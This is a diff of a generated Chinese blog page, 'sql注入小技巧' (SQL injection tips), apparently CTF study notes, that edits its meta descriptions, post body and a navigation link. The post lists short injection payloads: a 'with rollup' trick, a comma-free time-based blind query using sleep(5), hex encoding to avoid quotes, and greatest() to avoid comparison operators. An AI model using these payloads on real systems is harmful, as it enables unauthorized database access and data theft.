@@ -94,18 +94,18 @@
 
 
 
-<meta name="description" content="1.with rollup limit2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x724.大于小于绕过：greatest(n1,n2,">
+<meta name="description" content="1.group by pwd with rollup limit 1 offset 2 #2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x">
 <meta name="keywords" content="sql注入">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sql注入小技巧">
 <meta property="og:url" content="http://yoursite.com/2017/09/07/sql注入小技巧/index.html">
 <meta property="og:site_name" content="hhd">
-<meta property="og:description" content="1.with rollup limit2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x724.大于小于绕过：greatest(n1,n2,">
+<meta property="og:description" content="1.group by pwd with rollup limit 1 offset 2 #2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-11-18T07:29:00.205Z">
+<meta property="og:updated_time" content="2017-11-18T07:58:07.552Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sql注入小技巧">
-<meta name="twitter:description" content="1.with rollup limit2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x724.大于小于绕过：greatest(n1,n2,">
+<meta name="twitter:description" content="1.group by pwd with rollup limit 1 offset 2 #2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #3.绕过引号：利用十六进制，如”user”=0x750x730x650x">
 
 
 
@@ -339,7 +339,7 @@
       
 
       
-        <p>1.with rollup limit<br>2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #<br>3.绕过引号：利用十六进制，如”user”=0x750x730x650x72<br>4.大于小于绕过：greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值，如：greatest(ascii(substr(database(),0,1)),64)=64</p>
+        <p>1.group by pwd with rollup limit 1 offset 2 #<br>2.如果需要绕过逗号：’ union select case when substring((select xx from xx where xx) from 1 for 1)=’x’ then sleep(5) else 0 end #<br>3.绕过引号：利用十六进制，如”user”=0x750x730x650x72<br>4.大于小于绕过：greatest(n1,n2,n3,等)函数返回输入参数(n1,n2,n3,等)的最大值，如：greatest(ascii(substr(database(),0,1)),64)=64</p>
 
       
     </div>
@@ -370,8 +370,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/07/sql注入总结/" rel="next" title="sql注入总结">
-                <i class="fa fa-chevron-left"></i> sql注入总结
+              <a href="/2017/09/07/ctf工具寻址/" rel="next" title="ctf工具寻址">
+                <i class="fa fa-chevron-left"></i> ctf工具寻址
               </a>
             
           </div>
